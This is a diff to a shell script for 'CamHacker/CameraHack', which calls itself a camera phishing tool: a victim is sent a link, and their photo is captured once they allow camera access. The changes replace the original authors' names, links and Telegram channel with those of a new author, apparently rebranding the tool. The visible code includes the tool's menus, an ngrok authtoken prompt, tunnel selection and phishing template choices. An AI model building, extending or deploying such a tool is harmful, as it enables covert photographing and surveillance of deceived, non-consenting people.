@@ -3,10 +3,10 @@
 # CamHacker
 # Version    : 2.1
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra, SUMAN, Online Hacking
-# Github     : https://github.com/OnlineHacKing/
-# Email      : info@onlinehacking.in
-# Credits    : CamHacker, Suman, Noob-Hackers, TechChipNet, LinuxChoice, 
+# Author     : Mr Sadeghi 
+# Github     : https://github.com/Sir-Sadeghi/
+# Email      : mrcodesadeghi@gmail.com
+# Credits    : CamHacker, Mr Sadeghi 
 # Date       : 21-04-2022
 # Language   : Shell, HTML, Css
 # Portable File
@@ -48,7 +48,7 @@ echo -e "\e[95m
    echo -e $'\e[1;33m\e[0m\e[1;33m  [\e[0m\e[1;32m Follow Github : \e[36mhttps://github.com/sir-sadeghi/CameraHack\e[0m \e[1;32m\e[0m\e[1;33m]\e[0m'
    echo ""
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
-      echo -e "\e[93m    |M|o|h|a|m|d| |S|a|d|e|g|h|gi|"      
+      echo -e "\e[93m    |M|o|h|a|m|m|a|d| |S|a|d|e|g|h|gi|"      
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m' 
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m'
       echo -e "\e[95m    |S|U|M|A|N|"      
@@ -79,7 +79,7 @@ fi
 clear
 
 echo ""
-printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
+printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m Mr Sadeghi :\e[1;32m Join Telegram account \e[1;33m @lockader_virus  !\e[0m"
 sleep 4
 echo ""
 clear
@@ -193,7 +193,7 @@ replacer() {
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e '\n${success}Thanks for Using! Visit Site : www.onlinehacking.in\n'; exit" 2
+trap "echo -e '\n${success}Thanks for Using! Visit Site : Rubika.ir/coding_maestro\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
@@ -413,7 +413,7 @@ fi
 # Ngrok Authtoken
 if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
     echo -e "\n${ask}Enter your ngrok authtoken (Enter to Skip):"
-    printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+    printf "${cyan}\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
     read auth
     if [ -z $auth ]; then
         echo -e "\n${error}No authtoken!\n\007"
@@ -461,7 +461,7 @@ echo -e "\e[1;96m< < ============== < \e[93mChoose Option \e[96m> ==============
 echo ""
 
 sleep 1
-printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+printf "${cyan}\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -469,7 +469,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -480,7 +480,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -498,7 +498,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -514,14 +514,14 @@ read option
         echo -e "$red[ToolName]  ${cyan}  :[CameraHack]
 $red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra, Suman, OnlineHacking]
-$red[Github]     ${cyan} :[https://github.com/OnlineHacKing] 
-$red[Website]    ${cyan} :[https://www.onlinehacking.in/]
-$red[Telegarm]   ${cyan} :[https://t.me/onlinehacking]"
+$red[Author]     ${cyan} :[Mr Sadeghi]
+$red[Github]     ${cyan} :[https://github.com/Sir-sadeghi] 
+$red[Rubika]     ${cyan} :[https://Rubika.ir/coding_maestro]
+$red[Telegarm]   ${cyan} :[https://t.me/lockader_virus]"
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://www.onlinehacking.in/"
+        xdg-open "https://Rubika.ir/coding_maestro"
     elif echo $option | grep -q "0"; then
         exit 0
     else
